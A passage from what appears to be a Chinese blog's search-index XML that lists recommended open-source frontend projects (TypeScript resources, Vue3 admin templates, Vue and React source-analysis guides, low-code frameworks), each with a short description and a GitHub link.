编写易读、可扩展的应用。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664442819230-a43b9ecf-99be-4693-89b6-e754c4ee811f.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664442819230-a43b9ecf-99be-4693-89b6-e754c4ee811f.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/labs42io/clean-code-typescript">https://github.com/labs42io/clean-code-typescript</a><br /><strong>11. 谷歌 TypeScript 风格指南</strong><br />Google 的 TypeScript 风格指南。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664444037932-3bf69836-be2b-4da4-9662-7ffcdc33ab0b.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664444037932-3bf69836-be2b-4da4-9662-7ffcdc33ab0b.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://google.github.io/styleguide/tsguide.html">https://google.github.io/styleguide/tsguide.html</a><br /><strong>12. Awesome TypeScript</strong><br />很棒的 TypeScript 资源</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664445080945-3703231e-a035-4153-90ee-8ac0a22e6d63.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1664445080945-3703231e-a035-4153-90ee-8ac0a22e6d63.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/semlinker/awesome-typescript">https://github.com/semlinker/awesome-typescript</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue3.0项目</title>
      <link href="/2023/06/30/frontend/collection/projects/vue3.0-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/vue3.0-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>PPTist</strong><br />PPTist 是一个基于 Vue3.x + TypeScript + Pinia + Ant Design Vue + Canvas 的在线演示文稿（幻灯片）应用，还原了大部分 Office PowerPoint 常用功能，实现在线 PPT 的编辑、演示，支持导出 PPT 文件。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668699490411-87e44f8a-46e2-453e-a2b7-c778696cb1d0.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668699490411-87e44f8a-46e2-453e-a2b7-c778696cb1d0.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/pipipi-pikachu/PPTist">https://github.com/pipipi-pikachu/PPTist</a><br /><strong>vue-next-admin</strong><br />vue-next-admin 是一个基于 Vue3.x + Typescript + Vite + Element plus + Vuex 等，适配手机、平板、PC 的后台开源免费模板库。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668699809530-497827b4-b423-41b1-9f1f-922e675e5af1.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668699809530-497827b4-b423-41b1-9f1f-922e675e5af1.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/lyt-Top/vue-next-admin">https://github.com/lyt-Top/vue-next-admin</a><br /><strong>Vue vben admin</strong><br />Vue Vben Admin 是一个开源的中后台模版。使用了最新的 Vue3 + Vite + TypeScript + Pinia + Vue Router 等主流技术开发，开箱即用的中后台前端解决方案，也可用于学习参考。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668702599640-2f648c30-2872-4069-a92c-ac88b181aef3.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668702599640-2f648c30-2872-4069-a92c-ac88b181aef3.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/vbenjs/vue-vben-admin">https://github.com/vbenjs/vue-vben-admin</a><br /><strong>VUE3-MUSIC</strong><br />VUE3-MUSIC 是一个基于 Vue 3 + TypeScript + Vite + Pinia + Vueuse 开发的音乐播放器，界面模仿 QQ 音乐 Mac 客户端，支持黑夜模式。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668704125444-35738b1a-c055-4984-90a9-ade483263447.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668704125444-35738b1a-c055-4984-90a9-ade483263447.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/SmallRuralDog/vue3-music">https://github.com/SmallRuralDog/vue3-music</a><br /><strong>vue-pure-admin</strong><br />vue-pure-admin 是一款开源免费且开箱即用的中后台管理系统模版（兼容移动端）。使用 Vue3 + Vite + Element Plus、TypeScript + Pinia + Tailwindcss 等主流技术开发。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668700670222-52f89ed7-55ff-4019-865f-5c1ffd1ea984.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668700670222-52f89ed7-55ff-4019-865f-5c1ffd1ea984.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/xiaoxian521/vue-pure-admin">https://github.com/xiaoxian521/vue-pure-admin</a><br /><strong>vue3-composition-admin</strong><br />vue3-composition-admin 是一个管理端模板解决方案，它基于 Vue3、TypeScript、Vuex、Vue Router、Element plus，项目都是以 composition api 风格编写。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668700462537-b0665549-9924-447f-95e5-c2f2d02ab8ea.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668700462537-b0665549-9924-447f-95e5-c2f2d02ab8ea.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/RainManGO/vue3-composition-admin">https://github.com/RainManGO/vue3-composition-admin</a><br /><strong>newbee-mall-vue3-app</strong><br />newbee-mall-vue3-app 是一个基于 Vue3 + Vue Router4 + Vuex4 + Vant3 的大型单页面商城项目。商城系统包含首页门户、商品分类、新品上线、首页轮播、商品推荐、商品搜索、商品展示、购物车、订单结算、订单流程、个人订单管理、会员中心、帮助中心等模块。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668703700886-1cc91ae6-fa23-443d-9a12-f0f1286c7c64.png?x-oss-process=image/resize,w_1226,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668703700886-1cc91ae6-fa23-443d-9a12-f0f1286c7c64.png?x-oss-process=image/resize,w_1226,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/newbee-ltd/newbee-mall-vue3-app">https://github.com/newbee-ltd/newbee-mall-vue3-app</a><br /><strong>Element Plus</strong><br />Element Plus 是一个基于 Vue 3 + Vite + TypeScript + Vitest 的面向设计师和开发者的组件库。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668705068971-15946d41-83e4-44c2-b9a7-21bb92d29cbc.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668705068971-15946d41-83e4-44c2-b9a7-21bb92d29cbc.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/element-plus/element-plus">https://github.com/element-plus/element-plus</a><br /><strong>vue3-bigData</strong><br />vue3-bigData 是一个可视化系统，基于 Vue3.0 + Vuex + Vue Router + TypeScript + Echarts 实现，包括各种可视化图表。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668704458567-447ccb14-2a82-4db5-9f18-68ad38e0007c.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668704458567-447ccb14-2a82-4db5-9f18-68ad38e0007c.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/biubiubiu01/vue3-bigData">https://github.com/biubiubiu01/vue3-bigData</a><br /><strong>cool-admin-vue</strong><br />cool-admin 是一个基于 Vue3.x + Typescript + Vite + Element plus 的后台权限管理系统，开源免费，模块化、插件化、极速开发 CRUD，方便快速构建迭代后台管理系统。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668703087849-873bae17-115f-4fbc-8685-32cc8ef0eca8.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1668703087849-873bae17-115f-4fbc-8685-32cc8ef0eca8.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/cool-team-official/cool-admin-vue">https://github.com/cool-team-official/cool-admin-vue</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> vue3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue项目</title>
      <link href="/2023/06/30/frontend/collection/projects/vue-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/vue-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>概览：</strong><br />1. <strong>Marktext：</strong>笔记应用<br />2. <strong>YesPlayMusic：</strong>第三方网易云播放器<br />3. <strong>PicGo：</strong>图片上传应用<br />4 . <strong>PPTist：</strong>在线 PPT 应用<br />5. <strong>vue2-elm：</strong>仿饿了么<br />6. <strong>vue-element-admin：</strong>后台管理系统<br />7. <strong>Cider：</strong>Apple Music 播放器<br />8. <strong>newbee-mall-vue3-app：</strong>商城及后台管理系统</p><p><a name="JjHko"></a></p><h2 id="1-Marktext"><a href="#1-Marktext" class="headerlink" title="1. Marktext"></a>1. Marktext</h2><p>Marktext 是一个简单而优雅的开源 Markdown 编辑器，专注于速度和可用性，适用于 Linux、macOS 和 Windows。其支持实时预览、Markdown 扩展、输出 HTML 和 PDF 文件，主题切换、多种编辑模式、直接从剪贴板粘贴图像等功能。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655046933104-008a03e3-1e74-4e74-af7e-e527f7f4c4df.png?x-oss-process=image/resize,w_813,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655046933104-008a03e3-1e74-4e74-af7e-e527f7f4c4df.png?x-oss-process=image/resize,w_813,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="IXJID"></a></p><h2 id="2-YesPlayMusic"><a href="#2-YesPlayMusic" class="headerlink" title="2. YesPlayMusic"></a><br />2. YesPlayMusic</h2><p>YesPlayMusic 是一个高颜值的第三方网易云播放器，使用 Vue.js 全家桶开发。可以使用网易云账号登录（扫码&#x2F;手机&#x2F;邮箱登录），支持 MV 播放、歌词显示、每日推荐歌曲、每日自动签到、Light&#x2F;Dark Mode 自动切换、Touch Bar、音乐云盘、定义快捷键和全局快捷键等功能。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655047151049-eaaea59f-a749-4215-a392-5a289dffda12.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655047151049-eaaea59f-a749-4215-a392-5a289dffda12.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="sEWFq"></a></p><h2 id="3-PicGo"><a href="#3-PicGo" class="headerlink" title="3. PicGo"></a><br />3. PicGo</h2><p>PicGo 是一个用于快速上传图片并获取图片 URL 链接的工具，支持多种图床、拖拽图片上传、图片预览、上传图片后自动复制链接到剪切板、自定义复制到表格的链接格式、支持快捷键、支持通过发送 HTTP 请求调用 PicGo 上传等功能。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655047478503-81bd384b-af15-460b-b8ad-b08d308cbc56.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655047478503-81bd384b-af15-460b-b8ad-b08d308cbc56.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="qC0p3"></a></p><h2 id="4-PPTist"><a href="#4-PPTist" class="headerlink" title="4. PPTist"></a><br />4. PPTist</h2><p>PPTist 是一个基于 Vue3.x + TypeScript 的在线演示文稿（幻灯片）应用，还原了大部分 Office PowerPoint 常用功能，支持 文字、图片、形状、线条、图表、表格、视频、音频、公式 几种最常用的元素类型，每一种元素都拥有高度可编辑能力，同时支持丰富的快捷键和右键菜单，支持导出本地 PPTX 文件，支持移动端基础编辑和预览，支持 PWA。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655049422986-298118aa-73ca-468c-9d6f-c60ce56c6192.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655049422986-298118aa-73ca-468c-9d6f-c60ce56c6192.png?x-oss-process=image/resize,w_959,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="jHShP"></a></p><h2 id="5-vue2-elm"><a href="#5-vue2-elm" class="headerlink" title="5. vue2-elm"></a><br />5. vue2-elm</h2><p>vue2-elm 是一个基于 vue2 + vuex 构建一个具有 45 个页面的仿饿了么的大型单页面应用，涉及注册、登录、商品展示、购物车、下单等，是一个完整的流程。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655046524754-904daab9-fb3c-4b6b-b43b-36b2a113575a.png?x-oss-process=image/resize,w_398,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655046524754-904daab9-fb3c-4b6b-b43b-36b2a113575a.png?x-oss-process=image/resize,w_398,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="ELpnp"></a></p><h2 id="6-vue-element-admin"><a href="#6-vue-element-admin" class="headerlink" title="6. vue-element-admin"></a><br />6. vue-element-admin</h2><p>vue-element-admin 是一个后台前端解决方案，它基于 vue 和 element-ui 实现。它使用了最新的前端技术栈，内置了 i18n 国际化解决方案，动态路由，权限验证，提炼了典型的业务模型，提供了丰富的功能组件。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655046875319-243ad987-72d0-4f78-a678-dcbda8af87db.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655046875319-243ad987-72d0-4f78-a678-dcbda8af87db.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="yJiLM"></a></p><h2 id="7-Cider"><a href="#7-Cider" class="headerlink" title="7. Cider"></a><br />7. Cider</h2><p>Cider 是一个基于 Electron 和 Vue.js 的全新跨平台 Apple Music 体验，从头开始编写，同时兼顾性能和视觉效果。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655048457027-5b03b7d1-6310-49c3-a904-67349051dcf8.png?x-oss-process=image/resize,w_717,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655048457027-5b03b7d1-6310-49c3-a904-67349051dcf8.png?x-oss-process=image/resize,w_717,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="JWA2G"></a></p><h2 id="8-newbee-mall-vue3-app"><a href="#8-newbee-mall-vue3-app" class="headerlink" title="8. newbee-mall-vue3-app"></a><br />8. newbee-mall-vue3-app</h2><p>newbee-mall 项目是集电商，包括 newbee-mall 商城系统及 newbee-mall-admin 后台管理系统，基于 Spring Boot 2.X 和商城 Vue 3 以及相关技术栈开发。前台系统包含首页门户、商品分类新品上线、首页轮播、商品推荐、商品搜索、商品、购物车、订单结算、订单展示流程、订单管理、会员中心、帮助中心等模块。后台管理系统包含数据面板、播图管理、商品管理、订单管理、会员管理、分类管理、设置等模块。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655049066118-27c85460-d3d9-4960-b0a8-41226df7d9f1.png?x-oss-process=image/resize,w_1226,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1655049066118-27c85460-d3d9-4960-b0a8-41226df7d9f1.png?x-oss-process=image/resize,w_1226,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端框架源码解析项目</title>
      <link href="/2023/06/30/frontend/collection/projects/qian-duan-kuang-jia-yuan-ma-jie-xi-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/qian-duan-kuang-jia-yuan-ma-jie-xi-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>为什么要阅读源码？阅读优秀的代码的目的是让我们能够写出优秀的代码，更好的理解框架的工作方式。下面就来分享 5 个 Vue 源码解析开源项目、5 个 React 源码解析开源项目！<br /><strong>Vue3 源码系列</strong><br />Vue 中文社区提供的 Vue3 源码解析系列文章。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315401461-50f41bd0-c3d5-45e1-83b4-f86300ffa589.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315401461-50f41bd0-c3d5-45e1-83b4-f86300ffa589.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>在线阅读：</strong><a href="https://vue3js.cn/start/">https://vue3js.cn/start/</a><br /><strong>Vue3 源码解释</strong><br />Vue3 源码解释，提供了详细的测试用例和流程图。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315229933-073d9607-65b6-476c-a5fa-bb54eff264ac.png?x-oss-process=image/resize,w_957,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315229933-073d9607-65b6-476c-a5fa-bb54eff264ac.png?x-oss-process=image/resize,w_957,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>在线阅读：</strong><a href="https://kingbultsea.github.io/vue3-analysis/book/index.html">https://kingbultsea.github.io/vue3-analysis/book/index.html</a><br /><strong>图解 Vue、Vue-Router、Vuex 源码</strong><br />提供了多张思维导图辅助你深入了解 Vue | Vue-Router | Vuex 源码架构。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315334943-ba51d416-cedc-4237-87b9-a2e34149ed5c.png?x-oss-process=image/resize,w_864,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315334943-ba51d416-cedc-4237-87b9-a2e34149ed5c.png?x-oss-process=image/resize,w_864,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>在线阅读：</strong><a href="https://github.com/biaochenxuying/vue-family-mindmap">https://github.com/biaochenxuying/vue-family-mindmap</a><br /><strong>Vue.js 技术揭秘</strong><br />该电子书的目标是全方位细致深度解析 Vue.js 的实现原理，分析的版本为 Vue.js 2.5.17-beta.0。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315004198-8f021128-d5de-49be-b141-60ac77929dd9.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315004198-8f021128-d5de-49be-b141-60ac77929dd9.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>在线阅读：</strong><a href="https://ustbhuangyi.github.io/vue-analysis/">https://ustbhuangyi.github.io/vue-analysis/</a><br /><strong>Vue 源码逐行注释分析</strong><br />Vue 源码逐行注释分析，提供了 40MB+ 的 Vue 源码程序流程图思维导图。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315523433-12959e67-e2f5-46ee-b50a-691c5532bbbd.png?x-oss-process=image/resize,w_750,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315523433-12959e67-e2f5-46ee-b50a-691c5532bbbd.png?x-oss-process=image/resize,w_750,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/qq281113270/vue">https://github.com/qq281113270/vue</a><br /><strong>React 技术揭秘</strong><br />卡颂老师的《React 技术揭秘》电子书，该书的宗旨是打造一本严谨、易懂的 React 源码分析教程。内容不预设观点，所有观点来自 React 核心团队成员在公开场合的分享，其通过了丰富的参考资料，包括在线 Demo、文章、视频。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672314259847-197977a9-3250-4431-b8de-3697347b6bd1.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672314259847-197977a9-3250-4431-b8de-3697347b6bd1.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>在线阅读：</strong><a href="https://react.iamkasong.com/">https://react.iamkasong.com/</a><br /><strong>React 的秘密</strong><br />本项目是作者在阅读 React 源码过程中搭建的调试环境，学习过程中对源码添加了较为详细的注释，并记录了一些自己的理解与思考，输出了十几篇文章。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672314405952-f320b0de-db12-4e5f-bbaa-b37f047bc5d6.png?x-oss-process=image/resize,w_373,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672314405952-f320b0de-db12-4e5f-bbaa-b37f047bc5d6.png?x-oss-process=image/resize,w_373,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>在线阅读：</strong><a href="https://segmentfault.com/blog/react-secret?_ea=103006355">https://segmentfault.com/blog/react-secret?_ea&#x3D;103006355</a><br /><strong>图解 React 源码</strong><br />图解 React 源码，用大量配图的方式, 致力于将 React 原理表述清楚。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672314501439-ddcedc36-415a-4456-9096-ff3066c3f486.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672314501439-ddcedc36-415a-4456-9096-ff3066c3f486.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>在线阅读：</strong><a href="https://7kms.github.io/react-illustration-series/">https://7kms.github.io/react-illustration-series/</a><br /><strong>React 源码分析</strong><br />对 React 相关代码库以及框架的源码进行了一定的分析，并总结了一张详细的流程图。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672314759186-a979e439-44fe-4d2e-93a5-1dca0e708cad.png?x-oss-process=image/resize,w_958,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672314759186-a979e439-44fe-4d2e-93a5-1dca0e708cad.png?x-oss-process=image/resize,w_958,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>在线阅读：</strong><a href="https://buptlhuanyu.github.io/ReactNote/">https://buptlhuanyu.github.io/ReactNote/</a><br /><strong>React 源码系列</strong><br />手写 React、react-dom、react reconciler 主流程源码，加深对 react 源码的理解。包括 fiber，合成事件，hooks 实现原理，dom diff，reconciliation，scheduler 等。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315495743-ea1aaefc-8d6e-4c5b-b2f8-16a1e1b124ef.png?x-oss-process=image/resize,w_651,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1672315495743-ea1aaefc-8d6e-4c5b-b2f8-16a1e1b124ef.png?x-oss-process=image/resize,w_651,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github：</strong><a href="https://github.com/lizuncong/mini-react">https://github.com/lizuncong/mini-react</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> 源码解析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低代码项目</title>
      <link href="/2023/06/30/frontend/collection/projects/di-dai-ma-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/di-dai-ma-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><strong>1. Appsmith</strong><br />Appsmith 是一款开源低代码框架，主要用于构建管理面板、内部工具和仪表板等，允许拖放 UI 组件来构建页面，通过连接到任何 API、数据库或 GraphQL 源，并使用 JavaScript 语言编写逻辑，可以在短时间内创建内部应用程序。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1660216889925-96aef1a5-e313-4724-93ca-0d2a8f1338e6.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/gif/1500604/1660216889925-96aef1a5-e313-4724-93ca-0d2a8f1338e6.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 20.2k）：</strong><a href="https://github.com/appsmithorg/appsmith">https://github.com/appsmithorg/appsmith</a><br /><strong>2. Amis</strong><br />Amis 是百度开源的一块前端低代码框架，通过 JSON 配置就能生成各种后台页面，极大减少开发成本，甚至可以不需要了解前端。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228364007-83ed30d2-969b-45dd-a280-5cde21cc50d8.png?x-oss-process=image/resize,w_956,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228364007-83ed30d2-969b-45dd-a280-5cde21cc50d8.png?x-oss-process=image/resize,w_956,limit_0" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><strong>Github（⭐️ 11.6k）：</strong><a href="https://github.com/baidu/amis">https://github.com/baidu/amis</a><br /><strong>3. LowCodeEngine</strong><br />LowCodeEngine 低代码引擎是一款为低代码平台开发者提供的，具备强大扩展能力的低代码研发框架。由阿里巴巴前端委员会、钉钉宜搭联合出品。使用者只需要基于低代码引擎便可以快速定制符合自己业务需求的低代码平台。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228186081-4bf146e2-06eb-4b2c-aed3-c8a765e65233.png?x-oss-process=image/resize,w_959,limit_0" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/1500604/1660228186081-4bf146e2-06eb-4b2c-aed3-c8a765e65233.png?x-oss-process=image/resize,w_959,limit_0" 